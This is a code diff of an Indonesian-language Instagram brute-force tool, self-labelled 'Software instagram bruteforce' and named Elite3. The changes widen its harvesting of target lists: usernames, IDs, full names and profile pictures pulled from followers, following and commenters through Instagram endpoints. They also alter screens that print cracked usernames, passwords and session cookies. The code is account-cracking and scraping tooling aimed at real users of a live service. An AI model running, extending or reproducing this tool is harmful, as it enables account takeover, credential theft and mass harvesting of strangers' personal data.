@@ -1,9 +1,8 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2023-2025 ibrut developers (https://github.com/khamdihi-dev)
-Ganti Nama, Jual Enak Banget Lu, Gk Punya Malu??
-Gaush di edit-edit nanti error!, Coba aja Kalo ga percaya
+Software instagram bruteforce
+Copyright (c) 2023-2025 ELite3 developers (https://github.com/khamdihi-dev)
 """
 
 import os
@@ -13,7 +12,6 @@ import json
 import time
 import random
 import base64
-import questionary.styles
 import requests
 import questionary
 import uuid
@@ -24,10 +22,7 @@ from prompt_toolkit.styles import Style
 from concurrent.futures import ThreadPoolExecutor
 from security import password as changePASS
 from twofactor import private_request as factor
-from pointuser import reward
-from dotenv import load_dotenv
 from registrasi import license as Buy
-load_dotenv()
 
 bahasa = []
 dumpdata = []
@@ -80,7 +75,7 @@ def clear():
      / _// / / __/ _/{P}_/_ < {BJ}
     /___/_/_/\__/___/{P}____/{P} 
      
-  Hi, Welcome to {BJ}Elite3 {D}: {H}22.0{P}
+  Hi, Welcome to {BJ}Elite3 {D}: {H}22.2{P}
 
 ''')
     
@@ -184,7 +179,6 @@ class Login:
                 cokz = ';'.join(['%s=%s'%(name, value) for name,value in coks.items()])
                 return cokz
             except Exception as e:
-                print('failed decode bearer', e)
                 return bearer
         try:
             self.file = os.listdir('data')
@@ -202,12 +196,7 @@ class Login:
                         exit()
                     else:print('\nfailed :',self.cokie)
                 except:
-                    if 'sessionid' in self.ceks:
-                        self.cokie = re.search('datr=(.*)',self.ceks).group(1)
-                        self.sign = self.chekcokie(f'datr={self.cokie};')
-                        if self.sign == True:
-                            print('\nsuccess :',self.cokie)
-                            exit()
+                    print('Format tidak valid')
             exit('\nmokad semua cookienya')
         except FileNotFoundError:
             print(self.ulsd.Error_lang()['header'])
@@ -330,17 +319,16 @@ class menu:
         if len(self.styl['choices']) >0:self.styl['choices'].clear()
         self.styl['choices'].extend(self.dihi)
         self.sdyh = questionary.select(self.ulsd.menu_list()['message'],**self.styl, style=custom_style).ask()
-        if self.sdyh == self.dihi[0]:self.userinfo()
-        elif self.sdyh == self.dihi[1]:self.followers()
-        elif self.sdyh == self.dihi[2]:self.following()
-        elif self.sdyh == self.dihi[3]:self.komentar()
-        elif self.sdyh == self.dihi[4]:self.hasil()
-        elif self.sdyh == self.dihi[5]:self.crackulang()
-        elif self.sdyh == self.dihi[6]:self.decode_bearer()
-        elif self.sdyh == self.dihi[7]:self.stoksaya('https://github.com/khamdihi-dev/Prem/raw/refs/heads/main/stokakun.json')
-        elif self.sdyh == self.dihi[8]:self.findinboxkitten()
-        elif self.sdyh == self.dihi[9]:self.securityFree()
-        elif self.sdyh == self.dihi[10]:
+        if self.sdyh == self.dihi[0]:self.followers()
+        elif self.sdyh == self.dihi[1]:self.following()
+        elif self.sdyh == self.dihi[2]:self.komentar()
+        elif self.sdyh == self.dihi[3]:self.hasil()
+        elif self.sdyh == self.dihi[4]:self.crackulang()
+        elif self.sdyh == self.dihi[5]:self.decode_bearer()
+        elif self.sdyh == self.dihi[6]:self.stoksaya('https://github.com/khamdihi-dev/Prem/raw/refs/heads/main/stokakun.json')
+        elif self.sdyh == self.dihi[7]:self.findinboxkitten()
+        elif self.sdyh == self.dihi[8]:self.securityFree()
+        elif self.sdyh == self.dihi[9]:
             self.deletekuki = input(f'\n[{H}?{K}] Hapus Cokie [y/N] : ').lower()
             if self.deletekuki == 'n':pass
             else:os.remove('data/login.txt')
@@ -448,57 +436,6 @@ class menu:
         except:
             exit('\nDecode Error')
 
-    def userinfo(self):
-        if os.path.isfile('data/.keys.txt') is False:Buy.UserKey().konfirmasi_keys()
-        if os.path.isfile('data/login.txt') is False:Login().Loginwith()
-        self.ingf = self.ulsd.userandkeyinfo()
-        self.keys = open('data/.info.txt','r').read()
-        self.info = self.ingf['name']['headers']
-        self.username, self.fullname, self.follower, self.following, self.postingan = infone().profile()
-        self.info.update({
-            'username': self.keys.split('|')[1],
-            'bergabung': open('data/.join.txt','r').read(),
-            'kadarluarsa': self.keys.split('|')[2],
-            'licensi': self.keys.split('|')[0],
-            'instagram username': self.username,
-            'instagram fullname': self.fullname,
-            'instagram follower': self.follower,
-            'instagram following': self.following,
-            'instagram postingan': self.postingan,
-            'instagram cookies': open('data/login.txt','r').read()
-        })
-        if self.ingf['lang'] == 'en':
-            print(f'''
-
-username key       : {self.keys.split('|')[1]}
-joined             : {self.info['bergabung']}
-expiration         : {self.info['kadarluarsa']}
-license            : {self.info['licensi']}
-
-instagram username : {self.info['instagram username']}
-instagram fullname : {self.info['instagram fullname']}
-instagram followers: {self.info['instagram follower']}
-instagram following: {self.info['instagram following']}
-instagram posts    : {self.info['instagram postingan']}
-instagram cookies  : {self.info['instagram cookies']}
-
-            ''')
-            return
-        print(f'''
-
-username key        : {self.keys.split('|')[1]}
-bergabung           : {self.info['bergabung']}
-kadarluarsa         : {self.info['kadarluarsa']}
-license             : {self.info['licensi']}
-
-instagram username  : {self.info['instagram username']}
-instagram fullname  : {self.info['instagram fullname']}
-instagram followrs  : {self.info['instagram follower']}
-instagram following : {self.info['instagram following']}
-instagram postingan : {self.info['instagram postingan']}
-instagram cookies   : {self.info['instagram cookies']}
-        ''')
-    
     def followers(self):
         print(f'\n{self.ulsd.dumpflfw()["message"]}')
         self.username = input(self.ulsd.dumpflfw()["input"]).split(',')
@@ -551,9 +488,9 @@ instagram cookies   : {self.info['instagram cookies']}
                         print(f'''
 username  : {self.parse['username']}
 password  : {self.parse['password']}
-followers : {self.parse['followers']}
-following : {self.parse['following']}
-cookies   : {self.parse['cookie']}
+profile   : {self.parse['profile']}
+akun terhubung : {self.parse['akun terhubung']}
+cookies        : {self.parse['cookie']}
                             ''')
                     except:
                         print(self.xyz)
@@ -577,8 +514,7 @@ cookies   : {self.parse['cookie']}
                         print(f'''
 username  : {self.parse['username']}
 password  : {self.parse['password']}
-followers : {self.parse['followers']}
-following : {self.parse['following']}
+profile   : {self.parse['profile']}
 ''')
                     except:
                         print(self.xyz)
@@ -707,8 +643,14 @@ class dump:
                 self.data = {"query_hash": "c76146de99bb02f6415203be841dd25a","variables": json.dumps({"id":userid,"first":150,"after":next_pae})}
                 self.req = self.r.get('https://www.instagram.com/graphql/query/',params=self.data).json()
                 for self.users in self.req['data']['user']['edge_followed_by']['edges']:
-                    self.udata = self.users['node']['username']+'|'+self.users['node']['full_name'].replace('|','')
-                    dumpdata.append(self.udata)
+                    self.udata = {
+                        'username': self.users['node']['username'],
+                        'id': self.users['node']['id'],
+                        'full_name': self.users['node']['full_name'].replace('|',' '),
+                        'pic': self.users['node']['profile_pic_url']
+                    }
+                    if self.udata not in dumpdata:
+                        dumpdata.append(self.udata)
                     print(f' Success dump {len(dumpdata)}',end='\r'),sys.stdout.flush()
                 if(self.req['data']['user']['edge_followed_by']['page_info']['has_next_page']==True):
                     self.followers(userid, self.req['data']['user']['edge_followed_by']['page_info']['end_cursor'])
@@ -742,8 +684,14 @@ class dump:
                 self.data = {"query_hash": "d04b0a864b4b54837c0d870b0e77e076","variables": json.dumps({"id":userid,"first":150,"after":next_pae})}
                 self.req = self.r.get('https://www.instagram.com/graphql/query/',params=self.data).json()
                 for self.users in self.req['data']['user']['edge_follow']['edges']:
-                    self.udata = self.users['node']['username']+'|'+self.users['node']['full_name'].replace('|','')
-                    dumpdata.append(self.udata)
+                    self.udata = {
+                        'username': self.users['node']['username'],
+                        'id': self.users['node']['id'],
+                        'full_name': self.users['node']['full_name'].replace('|',' '),
+                        'pic': self.users['node']['profile_pic_url']
+                    }
+                    if self.udata not in dumpdata:
+                        dumpdata.append(self.udata)
                     print(f' Success dump {len(dumpdata)}',end='\r'),sys.stdout.flush()
                 if(self.req['data']['user']['edge_follow']['page_info']['has_next_page']==True):
                     self.following(userid, self.req['data']['user']['edge_follow']['page_info']['end_cursor'])
@@ -776,8 +724,15 @@ class dump:
                 })
                 self.req = self.r.get(f'https://www.instagram.com/api/v1/media/{media_id}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min_cursor}').json()
                 for self.usr in self.req['comments']:
-                    self.data_ = self.usr['user']['username'] +'|'+ self.usr['user']['full_name']
-                    if self.data_ not in dumpdata: dumpdata.append(self.data_)
+                    self.users = self.usr['user']
+                    self.udata = {
+                        'username': self.users['username'],
+                        'id': self.users['id'],
+                        'full_name': self.users['full_name'].replace('|',' '),
+                        'pic': self.users['profile_pic_url']
+                    }
+                    if self.udata not in dumpdata:
+                        dumpdata.append(self.udata)
                     print(f' Success dump {len(dumpdata)}',end='\r'),sys.stdout.flush()
                 self.abc = self.req['next_min_id']
                 self.komentar(media_id, self.abc)
